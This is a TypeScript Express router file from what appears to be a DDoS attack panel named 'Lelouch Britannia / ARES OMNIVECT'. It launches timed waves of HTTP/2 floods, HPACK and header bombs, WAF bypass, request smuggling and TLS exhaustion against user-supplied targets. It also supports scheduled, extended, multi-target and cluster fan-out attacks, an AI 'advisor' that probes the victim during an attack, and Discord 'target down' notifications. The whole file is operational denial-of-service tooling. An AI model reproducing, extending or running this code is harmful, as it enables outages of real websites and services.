        const combined: AbortSignal = typeof (AbortSignal as { any?: unknown }).any === "function"
          ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, burstAbort.signal])
          : burstAbort.signal;

        if (wave % 3 === 0) {
          // ★ MAX DEVASTATION wave — all top vectors at 2.5× (every 3rd wave) — v3 +25%
          void Promise.all([
            spawnPool("http2-flood",        target, port, Math.round(h2T    * 2.5), Math.min(h2W, 8),    combined, onStats),
            spawnPool("http-pipeline",      target, port, Math.round(pipeT  * 2.5), Math.min(pipeW, 8),  combined, onStats),
            spawnPool("h2-settings-storm",  target, port, Math.round(stormT * 2.5), Math.min(stormW, 8), combined, onStats),
            spawnPool("app-smart-flood",    target, port, Math.round(appT   * 2.5), Math.min(appW, 8),   combined, onStats),
            spawnPool("large-header-bomb",  target, port, Math.round(lhbT   * 2.5), Math.min(lhbW, 8),  combined, onStats),
            spawnPool("h2-ping-storm",      target, port, Math.round(pingT  * 2.5), Math.min(pingW, 4),  combined, onStats),
            spawnPool("waf-bypass",         target, port, Math.round(wafT   * 2.0), Math.min(wafW, 4),   combined, onStats),
            spawnPool("hpack-bomb",         target, port, Math.round(hpackT * 2.0), Math.min(hpackW, 4), combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else if (wave % 2 === 0) {
          // ★ App/TLS heavy wave — DB + crypto exhaustion (2.2× — was 1.8×)
          void Promise.all([
            spawnPool("app-smart-flood",      target, port, Math.round(appT  * 2.2), Math.min(appW, 8),  combined, onStats),
            spawnPool("large-header-bomb",    target, port, Math.round(lhbT  * 2.2), Math.min(lhbW, 8), combined, onStats),
            spawnPool("http2-priority-storm", target, port, Math.round(prioT * 2.2), Math.min(prioW, 6), combined, onStats),
            spawnPool("keepalive-exhaust",    target, port, Math.round(kaT   * 2.2), Math.min(kaW, 4),   combined, onStats),
            spawnPool("http-smuggling",       target, port, Math.round(smugT * 2.2), Math.min(smugW, 4), combined, onStats),
            spawnPool("tls-renego",           target, port, Math.round(tlsT  * 2.0), Math.min(tlsW, 4),  combined, onStats),
            spawnPool("ssl-death",            target, port, Math.round(sslT  * 2.0), Math.min(sslW, 4),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else {
          // ★ H2/Protocol heavy wave — bandwidth + H2 state exhaustion (2.0× — was 1.6×)
          void Promise.all([
            spawnPool("http2-flood",       target, port, Math.round(h2T    * 2.0), Math.min(h2W, 8),    combined, onStats),
            spawnPool("http-pipeline",     target, port, Math.round(pipeT  * 2.0), Math.min(pipeW, 8),  combined, onStats),
            spawnPool("h2-settings-storm", target, port, Math.round(stormT * 2.0), Math.min(stormW, 8), combined, onStats),
            spawnPool("http2-continuation",target, port, Math.round(contT  * 2.0), Math.min(contW, 8),  combined, onStats),
            spawnPool("h2-ping-storm",     target, port, Math.round(pingT  * 2.0), Math.min(pingW, 4),  combined, onStats),
            spawnPool("http2-priority-storm",target,port, Math.round(prioT * 1.8), Math.min(prioW, 4),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        }
        // 15s rest between waves
        await new Promise<void>(r => setTimeout(r, 15_000));
      }
    };
    void burstLoop();
    await geassPromise;
    return;
  }

  // All other real-network methods: single pool of CPU_COUNT workers
  await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
}

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", attackLimiter, async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id   = attack.id;
  const ctrl = new AbortController();
  const endTime = Date.now() + duration * 1000;
  const stopTimer = setTimeout(() => ctrl.abort("duration_expired"), duration * 1000);

  // Store for manual stop + extend support
  attackAborts.set(id, ctrl);
  attackTimers.set(id, stopTimer);
  attackEndTimes.set(id, endTime);

  // Init in-memory counters
  livePackets.set(id, 0);
  liveBytes.set(id, 0);
  livePps.set(id, 0);
  liveBps.set(id, 0);
  prevPktsSnap.set(id, 0);
  prevBytesSnap.set(id, 0);

  // ── Geass Override cluster fan-out (primary node only, not peer) ────────────
  if (method === "geass-override" && !req.query.peer) {
    fanOutToCluster(target, port, method, duration, threads);
  }

  void runAttackWorkers(method, target, port, threads, ctrl.signal,
    (pkts, bytes, conns) => onWorkerStats(id, pkts, bytes, conns)
  ).finally(async () => {
    // Final flush of any pending batch stats
    const pending = dbBatchPkts.get(id) ?? 0;
    const pendingBytes = dbBatchBytes.get(id) ?? 0;
    dbBatchPkts.delete(id);
    dbBatchBytes.delete(id);
    if (pending > 0 || pendingBytes > 0) void addStats(id, pending, pendingBytes);

    attackLiveConns.delete(id);
    livePackets.delete(id);
    liveBytes.delete(id);
    livePps.delete(id);
    liveBps.delete(id);
    prevPktsSnap.delete(id);
    prevBytesSnap.delete(id);
    // Keep timeseries for 60s after attack ends so panel can render final chart
    setTimeout(() => liveTimeseries.delete(id), 60_000);
    const t = attackTimers.get(id);
    if (t) clearTimeout(t);
    attackTimers.delete(id);
    attackAborts.delete(id);
    attackEndTimes.delete(id);
    try {
      const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
      if (cur?.status === "running") {
        const [fin] = await db.update(attacksTable)
          .set({ status: "finished", stoppedAt: new Date() })
          .where(eq(attacksTable.id, id)).returning();
        if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
      }
    } catch { /* ignore */ }
  });

  res.status(201).json(attack);
});

// Map for abort controllers + stop timers (for Extend support)
export const attackAborts  = new Map<number, AbortController>();

// ── Exported getter for SSE events route ─────────────────────────────────
export function getActiveAttackCount(): number { return attackAborts.size; }
const attackTimers  = new Map<number, ReturnType<typeof setTimeout>>();

// ── Scheduled attacks (GET must be BEFORE /attacks/:id to avoid conflict) ──
router.get("/attacks/scheduled", (_req, res): void => {
  res.json([...scheduledAttacks.values()]);
});

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  // Run all 3 queries in parallel — no full table scan in JS
  const [aggRows, methodRows, recentAttacks] = await Promise.all([
    // 1. Aggregate totals — O(1) via SQL COUNT/SUM
    db.select({
      totalAttacks:     sql<number>`COUNT(*)::int`,
      runningAttacks:   sql<number>`COUNT(*) FILTER (WHERE status = 'running')::int`,
      totalPacketsSent: sql<number>`COALESCE(SUM(packets_sent), 0)::bigint`,
      totalBytesSent:   sql<number>`COALESCE(SUM(bytes_sent), 0)::bigint`,
    }).from(attacksTable),
    // 2. Per-method counts — O(distinct methods) index scan
    db.select({
      method: attacksTable.method,
      count:  sql<number>`COUNT(*)::int`,
    }).from(attacksTable).groupBy(attacksTable.method),
    // 3. Recent 10 only — O(10) with LIMIT
    db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt)).limit(10),
  ]);
  const agg = aggRows[0];
  res.json({
    totalAttacks:     agg.totalAttacks,
    runningAttacks:   agg.runningAttacks,
    totalPacketsSent: Number(agg.totalPacketsSent),
    totalBytesSent:   Number(agg.totalBytesSent),
    attacksByMethod:  methodRows,
    recentAttacks,
    cpuCount:         CPU_COUNT,
  });
});

// Live timeseries — last 60 samples (1 per second) for chart rendering
router.get("/attacks/:id/timeseries", (req, res): void => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const series = liveTimeseries.get(id) ?? [];
  res.json({ samples: series, max: TIMESERIES_MAX });
});

// Live in-memory stats — real-time, no DB latency
// Returns conns, pps, bps, totalPackets, totalBytes, running
router.get("/attacks/:id/live", (req, res): void => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const running = attackAborts.has(id);
  res.json({
    conns:        attackLiveConns.get(id) ?? 0,
    running,
    pps:          livePps.get(id)     ?? 0,
    bps:          liveBps.get(id)     ?? 0,
    totalPackets: livePackets.get(id) ?? 0,
    totalBytes:   liveBytes.get(id)   ?? 0,
  });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

// ── Extend running attack by +60s ────────────────────────────────────────
router.patch("/attacks/:id/extend", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const ctrl = attackAborts.get(id);
  if (!ctrl) { res.status(404).json({ error: "Attack not running" }); return; }
  const addSec = typeof req.body?.seconds === "number" ? Math.min(req.body.seconds, 3600) : 60;

  // Clear old stop timer, arm new one using correct remaining time
  // Bug-fix: previously reset timer to addSec from NOW, losing remaining original time.
  // Now we compute: newEndTime = max(now, currentEndTime) + addSec
  const old = attackTimers.get(id);
  if (old) clearTimeout(old);
  const currentEnd = attackEndTimes.get(id) ?? Date.now();
  const newEnd     = Math.max(Date.now(), currentEnd) + addSec * 1000;
  const msFromNow  = newEnd - Date.now();
  attackEndTimes.set(id, newEnd);
  const newTimer = setTimeout(() => ctrl.abort("duration_expired"), msFromNow);
  attackTimers.set(id, newTimer);

  const [a] = await db.update(attacksTable)
    .set({ duration: sql`${attacksTable.duration} + ${addSec}` })
    .where(eq(attacksTable.id, id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json({ ok: true, extended: addSec, ...a });
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackAborts.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackAborts.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a, "attack_stopped");
  res.json({ ok: true, ...a });
});

// ── AI Advisor — Groq-powered live attack analysis ─────────────────────────
router.get("/attacks/:id/ai-advisor", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const [attack] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
  if (!attack) { res.status(404).json({ error: "Not found" }); return; }
  const pps   = livePps.get(id)     ?? 0;
  const bps   = liveBps.get(id)     ?? 0;
  const conns = attackLiveConns.get(id) ?? 0;
  // Quick target probe
  let targetStatus = "unknown"; let targetLatencyMs = 0;
  try {
    const t0 = Date.now();
    const pr = await fetch(`https://${attack.target}/`, { signal: AbortSignal.timeout(5000), headers: { "User-Agent": "Mozilla/5.0" } });
    targetLatencyMs = Date.now() - t0; targetStatus = String(pr.status);
  } catch { targetStatus = "offline"; }
  try {
    const advice = await groqAdvisor(attack, pps, bps, conns, targetStatus, targetLatencyMs);
    res.json({ ...advice, metrics: { pps, bps, conns, targetStatus, targetLatencyMs, running: attackAborts.has(id) } });
  } catch (e) { res.status(503).json({ error: "AI advisor unavailable", detail: String(e) }); }
});

// ── Scheduled attacks ──────────────────────────────────────────────────────
router.post("/attacks/schedule", (req, res): void => {
  const { target, port, method, duration, threads, scheduledFor, webhookUrl } = req.body as Record<string, unknown>;
  if (!target || !port || !method || !duration || !threads || !scheduledFor) {
    res.status(400).json({ error: "Missing: target, port, method, duration, threads, scheduledFor" }); return;
  }
  const fireAt = new Date(scheduledFor as string).getTime();
  if (isNaN(fireAt) || fireAt <= Date.now()) {
    res.status(400).json({ error: "scheduledFor must be a future ISO timestamp" }); return;
  }
  const sid = `sched_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
  const sa: ScheduledAttack = {
    id: sid, target: String(target), port: Number(port),
    method: String(method), duration: Number(duration), threads: Number(threads),
    webhookUrl: webhookUrl ? String(webhookUrl) : undefined,
    scheduledFor: fireAt, createdAt: Date.now(),
  };
  scheduledAttacks.set(sid, sa);
  res.status(201).json(sa);
});

router.delete("/attacks/scheduled/:sid", (req, res): void => {
  const { sid } = req.params;
  if (!scheduledAttacks.has(sid)) { res.status(404).json({ error: "Scheduled attack not found" }); return; }
  scheduledAttacks.delete(sid);
  res.json({ ok: true, deleted: sid });
});

// ── Multi-target simultaneous attack ──────────────────────────────────────
router.post("/attacks/multi", async (req, res): Promise<void> => {
  const { targets, port, method, duration, threads, webhookUrl } = req.body as {
    targets: string[]; port?: number; method?: string; duration?: number; threads?: number; webhookUrl?: string;
  };
  if (!Array.isArray(targets) || targets.length === 0) {
    res.status(400).json({ error: "targets must be a non-empty array" }); return;
  }
  if (targets.length > 5) { res.status(400).json({ error: "Maximum 5 simultaneous targets" }); return; }
  const results: (typeof attacksTable.$inferSelect)[] = [];
  for (const tgt of targets) {
    const [atk] = await db.insert(attacksTable).values({
      target: tgt, port: port ?? 443, method: method ?? "geass-override",
      duration: duration ?? 60, threads: threads ?? 1000,
      status: "running", packetsSent: 0, bytesSent: 0,
      webhookUrl: webhookUrl ?? null,
    }).returning();
    const aid = atk.id;
    const ctrl = new AbortController();
    const endMs = Date.now() + (duration ?? 60) * 1000;
    attackAborts.set(aid, ctrl);
    attackTimers.set(aid, setTimeout(() => ctrl.abort("duration_expired"), (duration ?? 60) * 1000));
    attackEndTimes.set(aid, endMs);
    livePackets.set(aid, 0); liveBytes.set(aid, 0);
    livePps.set(aid, 0);     liveBps.set(aid, 0);
    prevPktsSnap.set(aid, 0); prevBytesSnap.set(aid, 0);
    if ((method ?? "geass-override") === "geass-override") fanOutToCluster(tgt, port ?? 443, "geass-override", duration ?? 60, threads ?? 1000);
    void runAttackWorkers(method ?? "geass-override", tgt, port ?? 443, threads ?? 1000, ctrl.signal,
      (pkts, bytes, conns) => onWorkerStats(aid, pkts, bytes, conns)
    ).finally(async () => {
      const pp = dbBatchPkts.get(aid) ?? 0; const bb = dbBatchBytes.get(aid) ?? 0;
      dbBatchPkts.delete(aid); dbBatchBytes.delete(aid);
      if (pp > 0 || bb > 0) void addStats(aid, pp, bb);
      attackLiveConns.delete(aid); livePackets.delete(aid); liveBytes.delete(aid);
      livePps.delete(aid);         liveBps.delete(aid);
      prevPktsSnap.delete(aid);    prevBytesSnap.delete(aid);
      const t = attackTimers.get(aid); if (t) clearTimeout(t);
      attackTimers.delete(aid); attackAborts.delete(aid); attackEndTimes.delete(aid);
      setTimeout(() => liveTimeseries.delete(aid), 60_000);
      try {
        const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, aid));
        if (cur?.status === "running") {
          const [fin] = await db.update(attacksTable).set({ status: "finished", stoppedAt: new Date() })
            .where(eq(attacksTable.id, aid)).returning();
          if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
        }
      } catch { /* ignore */ }
    });
    results.push(atk);
  }
  res.status(201).json({ attacks: results, count: results.length });
});

// ── Kill Webhook notify — fire Discord/custom webhook with attack kill confirmation ──
router.post("/notify", async (req, res): Promise<void> => {
  const { webhookUrl, attackId, event, message } = req.body as Record<string, string>;
  if (!webhookUrl) { res.status(400).json({ error: "webhookUrl is required" }); return; }
  let attackData: typeof attacksTable.$inferSelect | null = null;
  if (attackId) {
    try {
      const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, parseInt(attackId, 10)));
      attackData = a ?? null;
    } catch { /* ignore */ }
  }
  const evt = event ?? "target_down";
  const desc = message ?? (attackData ? `Target **${attackData.target}** confirmed OFFLINE` : "Target confirmed OFFLINE");
  const payload = {
    username: "Lelouch Britannia",
    avatar_url: "https://i.imgur.com/ZHKmhI7.png",
    embeds: [{
      title: evt === "target_down" ? "🔴 TARGET DOWN — GEASS CONFIRMED" : "⚔️ LELOUCH BRITANNIA — ATTACK EVENT",
      description: desc,
      color: evt === "target_down" ? 0xFF0000 : 0xFF6600,
      fields: (() => {
        if (!attackData) return [{ name: "Event", value: evt, inline: true }];
        const ad = attackData;
        return [
          { name: "🎯 Target",       value: `\`${ad.target}\``,  inline: true },
          { name: "⚔️ Method",       value: `\`${ad.method}\``,  inline: true },
          { name: "⏱ Duration",      value: `${ad.duration}s`,   inline: true },
          { name: "📦 Packets Sent",  value: (livePackets.get(ad.id) ?? ad.packetsSent ?? 0).toLocaleString(), inline: true },
          { name: "📊 PPS at Kill",   value: (livePps.get(ad.id) ?? 0).toLocaleString(),                  inline: true },
          { name: "🔌 Status",        value: ad.status,           inline: true },
        ];
      })(),
      timestamp: new Date().toISOString(),
      footer: { text: "Lelouch Britannia • ARES OMNIVECT ∞ v3" },
    }],
  };
  try {
    const r = await fetch(webhookUrl, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload), signal: AbortSignal.timeout(6000),
    });
    res.json({ ok: true, status: r.status });
  } catch (e) { res.status(503).json({ error: "Webhook delivery failed", detail: String(e) }); }
});

export default router;
